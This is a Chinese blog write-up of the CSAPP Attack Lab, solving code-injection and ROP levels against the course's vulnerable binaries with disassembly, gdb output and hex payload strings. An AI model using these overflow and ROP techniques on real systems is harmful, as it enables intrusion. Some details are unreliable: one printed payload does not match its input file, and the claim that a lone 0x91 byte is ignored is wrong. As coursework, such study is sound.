---
title: CSAPP Lab3 Understanding Buffer Overflow Bugs
date: 2022-06-03 12:00:00
cover: https://cdn.jsdelivr.net/gh/zion4h/picture-home@main/img252.jpg
categories: [编程, Labs, CMU 15-213]
toc: true
---

由于是直接上手做的，看完 readme 后也是一头雾水，结合 [attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 和原书第三版的 3.10.3 和 3.10.4 才恍然大悟，当然视频资料也有不少。另外，之前又犯了个错误，就是我在 mac 上反编译了 ctarget，注意 csapp 的系列实验都应在 x86 环境下进行。

<!--more-->

## 准备

实验 3 主要分成两个部分，在 ctarget 做代码注入 CI 攻击，在 rtarget 上做返回导向编程 ROP 攻击。在 CI 部分有 3 个 level，而在 ROP 部分有两个 level，由于我们不是 cmu 的学生，所以在调试命令时注意加上 - q 禁止发送结果给服务器。

为了方便，我们将 ctarget 和 rtarget 反汇编到 ctarget.s 和 rtarget.s 中：

```shell
[root@MiWiFi-R4A-srv target1]# objdump -d rtarget > rtarget.s
[root@MiWiFi-R4A-srv target1]# objdump -d ctarget > ctarget.s
```

## level1

这里是 [attacklab.pdf (cmu.edu)](http://csapp.cs.cmu.edu/3e/attacklab.pdf) 给出的代码：

```c
void test()
{
 int val;
 val = getbuf();
 printf("No exploit. Getbuf returned 0x%x\n", val);
}

unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

void touch1()
{
 vlevel = 1; /* Part of validation protocol */
 printf("Touch1!: You called touch1()\n");
 validate(1);
 exit(0);
}
```

```X86ASM
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28           sub    $0x28,%rsp
  4017ac: 48 89 e7              mov    %rsp,%rdi
  4017af: e8 8c 02 00 00        callq  401a40 <Gets>
  4017b4: b8 01 00 00 00        mov    $0x1,%eax
  4017b9: 48 83 c4 28           add    $0x28,%rsp
  4017bd: c3                    retq   
  4017be: 90                    nop
  4017bf: 90                    nop

00000000004017c0 <touch1>:
  4017c0: 48 83 ec 08           sub    $0x8,%rsp
  4017c4: c7 05 0e 2d 20 00 01  movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb: 00 00 00 
  4017ce: bf c5 30 40 00        mov    $0x4030c5,%edi
  4017d3: e8 e8 f4 ff ff        callq  400cc0 <puts@plt>
  4017d8: bf 01 00 00 00        mov    $0x1,%edi
  4017dd: e8 ab 04 00 00        callq  401c8d <validate>
  4017e2: bf 00 00 00 00        mov    $0x0,%edi
  4017e7: e8 54 f6 ff ff        callq  400e40 <exit@plt>
```

在 level1 中我们需要通过 CI 让 test 执行时跳转到 touch1 中，而程序的跳转和 rsp 寄存器有关，一开始 rsp 给了 0x28 的空间供 getbuf 栈帧使用，但如果 getbuf 输入了 40 字节以上，就会将父帧 test 的状态破坏。基于这个原理，我们处理方式也比较简单直接，首先用随意内容填充前 40 字节，再追加 touch1 的入口地址，这样当 getbuf 返回时，rsp 会将该地址弹出到 pc，从而成功执行 touch1 的代码。由于 touch1 最后直接 exit 了，所以我们无需关心进入 touch1 之后发生的事情。

另外，为了方便我们填充字节，lab 提供了一个 16 进制转换工具，我们按照附录示例方式写入即可，写入方式也挺多样的。

```X86ASM
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40 个空白字符 */
c0 17 40 00 00 00 00 00 /* 目标 touch1 入口地址 */
```

```bash
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
 user id bovik
 course 15213-f15
 lab attacklab
 result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

另外，Intel 8086 系列都是小端对齐的，也就是低地址放低位，如 0x00000000004017c0，c0 在最低位所以应该放在地址最小的位置，也就是起始位置。这里可能不好想象，比如一台 64 位机器，栈上每层都是 8 字节，我的 ctarget.l1.txt 也是按这种方式排列的，便于参考阅读。

## level2

```c
void touch2 (unsigned val)
{
 vlevel = 2; /* Part of validation protocol */
 if (val == cookie) {
  printf("Touch2!: You called touch2(0x%.8x)\n", val);
  validate(2);
 } else {
  printf("Misfire: You called touch2(0x%.8x)\n", val);
  fail(2);
 }
 exit(0);
}
```

```X86ASM
00000000004017ec <touch2>:
  4017ec: 48 83 ec 08           sub    $0x8,%rsp
  4017f0: 89 fa                 mov    %edi,%edx
  4017f2: c7 05 e0 2c 20 00 02  movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9: 00 00 00 
 ...
```

类似的，如果我们需要切换到 touch2，除了引导 touch2 的入口地址 0x4017ec 外还需要给出参数 val，让 val 和 cookie（0x59b997fa）相等。这里需要我们插入代码段，完整做完 lab2 后已经不难写出如下代码：

```X86ASM
movl    $0x59b997fa, %edi # 提供 val
pushq   0x4017ec          # touch2
retq

```

movl、movq 都是 mov 操作，前者是 32 位，后者 64 位，实验给的 cookie 显然用 32 位即可，写汇编时注意尾部提行，不然可能会报 warning。

现在我们将其编译后再反编译获取其字节码表达形式，注意，这里有个问题是 objdump 反编译时可能会遇到格式问题，我因为这个原因失败了好几次（默认 x86-84 格式），最好是手动选择 intel 或者 att 格式，前者适用于 windows、DOS，后者适用于 Linux。

```X86ASM
l2.o：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0: bf fa 97 b9 59        mov    $0x59b997fa,%edi
   5: ff 34 25 ec 17 40 00  pushq  0x4017ec
   c: c3                    retq
```

但是我最后还是失败了，我参考了别人成功通过的代码，发现我反汇编后得到的 pushq 和他们的不一样，所以果断换另外一种不需要 pushq 的方法，直接将其放到栈上。

```X86ASM
mov     $0x59b997fa, %rdi # 提供 val
retq
```

```X86ASM
l2.o：     文件格式 elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0: 48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi
   7: c3                    retq
```

我们将这段代码通过 getbuf 传到 rsp-0x28 处，再用类似 level1 的方法跳转到这里执行这段代码。现在整个程序逻辑就比较清晰了，getbuf 执行完后进入我们的插入代码中，执行完后进入 touch2。

```bash
[root@MiWiFi-R4A-srv target1]# gdb ctarget
GNU gdb (GDB) Red Hat Enterprise Linux 10.2-8.el9
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
...（省略了）
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>: sub    $0x28,%rsp
   0x00000000004017ac <+4>: mov    %rsp,%rdi
   0x00000000004017af <+7>: call   0x401a40 <Gets>
   0x00000000004017b4 <+12>: mov    $0x1,%eax
   0x00000000004017b9 <+17>: add    $0x28,%rsp
   0x00000000004017bd <+21>: ret    
End of assembler dump.
(gdb) p $rsp
$1 = (void *) 0x5561dca0
(gdb) stepi
14 in buf.c
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>: sub    $0x28,%rsp
=> 0x00000000004017ac <+4>: mov    %rsp,%rdi
   0x00000000004017af <+7>: call   0x401a40 <Gets>
   0x00000000004017b4 <+12>: mov    $0x1,%eax
   0x00000000004017b9 <+17>: add    $0x28,%rsp
   0x00000000004017bd <+21>: ret    
End of assembler dump.
(gdb) p $rsp
$2 = (void *) 0x5561dc78
```

通过 GDB 我们轻松获得 rsp 的位置是 0x5561dca0 而 rsp-0x28 的位置自然是 0x5561dc78 了，这就是我们的跳转位置。

```shell
48 c7 c7 fa 97 b9 59 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 插入代码段 */
78 dc 61 55 00 00 00 00 /* rsp-0x24 */
ec 17 40 00 00 00 00 00 /* 目标 touch2 入口地址 */
```

```bash
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
 user id bovik
 course 15213-f15
 lab attacklab
 result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

## level3

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

```X86ASM
00000000004018fa <touch3>:
  4018fa: 53                    push   %rbx
  4018fb: 48 89 fb              mov    %rdi,%rbx
  4018fe: c7 05 d4 2b 20 00 03  movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905: 00 00 00
 ...
```

在 level3 中，我们的参数变成了字符串，同时由于 touch3 调用了子函数 hexmatch，尤其里面的声明和随机位置赋值，这意味着如果我们还想像 level2 一样在 rsp-0x28 处插入代码就有可能被覆盖掉。注意，我们是需要在存字符串的，一旦被覆盖了，字符串就丢失了。因此，我们换到处于更高位置的 test 帧处做字符串存储，同样的，由于 touch3 直接 exit 我们不用担心后续。

由于 level2 相同编译问题，我将 touch3 的入口也放到后面了，因此字符串的实际实际位置在 rsp+0x10，也就是 0x5561dcb0。

```X86ASM
movl    $0x5561dcb0, %edi # 提供 sval
retq

```

```X86ASM
0000000000000000 <.text>:
   0: bf b0 dc 61 55        mov    $0x5561dcb0,%edi
   5: c3                    retq
```

通过查询 ASCII 表，我们可以得到 cookie 0x59b997fa 的字节码表示 “35 39 62 39 39 37 66 61”。

```X86ASM
bf b0 dc 61 55 c3 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 插入代码段 */
78 dc 61 55 00 00 00 00 /* rsp-0x24 */
fa 18 40 00 00 00 00 00 /* touch3 入口 */
35 39 62 39 39 37 66 61 /* 字符串，注意用 00 结尾 */
00
```

```shell
[root@MiWiFi-R4A-srv target1]# ./hex2raw < ctarget.l3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
 user id bovik
 course 15213-f15
 lab attacklab
 result 1:PASS:0xffffffff:ctarget:3:BF B0 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## level4

由于 DI 攻击方式太过常见，所以很多程序都自带针对 DI 的防御手段，比如栈随机化、栈破坏检测（通过金丝雀值）和限制可执行代码区域。但显然它们也不能做到尽善尽美，level4 和 level5 就要求我们在以上限制下重新完成 touch2 和 touch3 的骇入。

现在我们重新梳理 touch2，不难发现其实我们真正需要的操作是让寄存器 edi 获得 0x59b997fa。由于当前的限制条件，我们只能将其写在栈上再通过 pop 读出，且这个 pop 操作只能通过 lab 给出的 “工具代码段” 也就是 start\_farm 到 end\_farm 这一部分得到。

首先，参考实验说明的附录表格，我们知道 pop 操作是 0x58\~0x5f，于是去 farm 中寻找，发现只有 58 和 5c，分别对应 popq rax 和 popq rsp，这里再次说明 q 后缀是 64 位，l 后缀是 32 位。了解二者含义都知道，我们只有一个选项那就是 popq rax，也就是说我们存储的 0x59b997fa 会被送到 rax。

这里我们取 addval，0x4019a7+4=0x4019ab：

```X86ASM
00000000004019a7 <addval_219>:
  4019a7: 8d 87 51 73 [58] 90   lea    -0x6fa78caf(%rdi),%eax
  4019ad: c3                    retq   

00000000004019b5 <setval_424>:
  4019b5: c7 07 54 c2 [58] 92   movl   $0x9258c254,(%rdi)
  4019bb: c3                    retq
```

那么我们现在是希望该字段被送到 edi 或者 rdi，通过查找 movl 和 movq 表，再对照 farm 内容，我们找到了三条数据，由于包含”49 89 c7” 对应 “movq rax, rdi”，所以就不用再去找中转了（与之相对的，level5 需要）。

对比这三条，我选择了 addval，因为后面直接跟着 c3，对应汇编中的 “retq”，取 0x4019a0+2，即 0x4019a2：

```X86ASM
00000000004019a0 <addval_273>:
  4019a0: 8d 87 [48 89 c7] c3   lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3                    retq

00000000004019ae <setval_237>:
  4019ae: c7 07 [48 89 c7] c7   movl   $0xc7c78948,(%rdi)
  4019b4: c3                    retq

00000000004019c3 <setval_426>:
  4019c3: c7 07 [48 89 c7] 90   movl   $0x90c78948,(%rdi)
  4019c9: c3                    retq
```

最后，成功构造出指定输入，我用的塔式结构，也比较清晰易懂：）

```X86ASM
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40 个空白字符 */
ab 19 40 00 00 00 00 00 /* 弹出目标数据给 rax */
fa 97 b9 59 00 00 00 00 /* 目标数据 */
a2 19 40 00 00 00 00 00 /* rax 传给 rdi */
ec 17 40 00 00 00 00 00 /* touch2 入口 */
```

```X86ASM
[root@MiWiFi-R4A-srv target1]# ./hex2raw < rtarget.l4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
 user id bovik
 course 15213-f15
 lab attacklab
 result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## level5

首先我们先梳理一下 touch3，其核心需求是让寄存器 edi 获得我们存放字符串的起始地址，所以我们其实需要准备三个东西：字符串、touch3 入口、字符串地址。但是字符串地址我们是无法确定的，我们只能通过 rsp 间接确定其位置，于是我们的整个结构如下：

```X86ASM
/* 40 个空白字符 */
/* 1. 传 rsp 的位置（也就是 2. 的位置）给寄存器 x */
/* 2. 获取偏移给 rax*/
/* 3. 偏移 即指令 2.~5. 的总长度 */
/* 4.x 加上偏移（即地址）传给 rdi */
/* 5.touch3 入口 */
/* 6. 字符串 */
```

首先，我们要找能够接收 rsp 的寄存器，也就是形如”movq rsp x“的指令（48 89 e0\~7），发现只有”48 89 e0“。这里我们依然挑选最干净的第一项，它后面直接跟着 c3，得到 0x401a06。

```X86ASM
0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3                    retq

0000000000401a47 <addval_201>:
  401a47: 8d 87 48 89 e0 c7     lea    -0x381f76b8(%rdi),%eax
  401a4d: c3                    retq

0000000000401a5a <setval_299>:
  401a5a: c7 07 48 89 e0 91     movl   $0x91e08948,(%rdi)
  401a60: c3                    retq
```

然后，我们要找到能将该地址和偏移地址加起来的函数，我找了半天没发现 add，但找到了另一个更贴切的 add\_xy，直接用这整个函数即可，得到 0x4019d6。

```X86ASM
00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq
```

但是我们发现它只接收 rdi 和 rsi，于是我又慢慢去找二者相关的 movq 或 movl 函数，因为涉及到中间变量相互传值，所以这是个漫长而乏味的过程。总之，最后找到了符合目标的一组传值过程，然后将之前总结的细化一下。

```X86ASM
1.movq rsp rax 此时 rsp 指向 2.
2.movq rax rdi
3.pop eax
4. 偏移值=10-1=9 层（字符串还被 9 条指令压着呢）所以 9x8=72 字节
5.movl eax edx
6.movl edx ecx
7.movl ecx esi
8.lea (rdi, rsi, 1) rax
9.movq rax rdi
10.touch3
11. 字符串
```

其中需要注意的细节就是 q 和 l 后缀，rsp 地址是 64 位的必须要用 movq，而偏移量显然可以用 32 位传递，于是拓展到 movl。

```X86ASM
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* 40 个空白字符 */
06 1a 40 00 00 00 00 00 /* mov rsp rax */
c5 19 40 00 00 00 00 00 /* mov rax rdi 4019c3+2 */
ab 19 40 00 00 00 00 00 /* pop rax */
48 00 00 00 00 00 00 00 /* 偏移 72=0x48 */
dd 19 40 00 00 00 00 00 /* mov eax edx 89 c2 4019db+2 */
70 1a 40 00 00 00 00 00 /* mov edx ecx 89 d1 401a6e+2 */
63 1a 40 00 00 00 00 00 /* mov ecx esi 89 ce 401a61+2 */
d6 19 40 00 00 00 00 00 /* lea (rdi, rsi, 1) rax 4019d6 */
c5 19 40 00 00 00 00 00 /* mov rax rdi */
fa 18 40 00 00 00 00 00 /* touch3 入口 4018fa */
35 39 62 39 39 37 66 61 /* 字符串，注意用 00 结尾 */
00
```

```shell
[root@MiWiFi-R4A-srv target1]# ./hex2raw < rtarget.l5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
 user id bovik
 course 15213-f15
 lab attacklab
 result 1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 63 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

注意：

1.0x90 对应于”no op“操作，所以如果我们看到这样的汇编码，又想调用”89 ce“时放心使用即可。

```X86ASM
0000000000401a11 <addval_436>:
  401a11:  8d 87 89 ce 90 90      lea    -0x6f6f3177(%rdi),%eax
  401a17:  c3                     retq
```

2.`0xc3` 对应返回值之前有讲过

3\. 单个字节不被看作操作，会被自动忽略，比如下面的代码，我们想要”89 d1“，由于和”c3“只间隔一个字节，中间的”91“会被忽略，即可以截取该代码段运行。

```X86ASM
0000000000401a6e <setval_167>:
  401a6e:  c7 07 89 d1 91 c3      movl   $0xc391d189,(%rdi)
  401a74:  c3                     retq
```
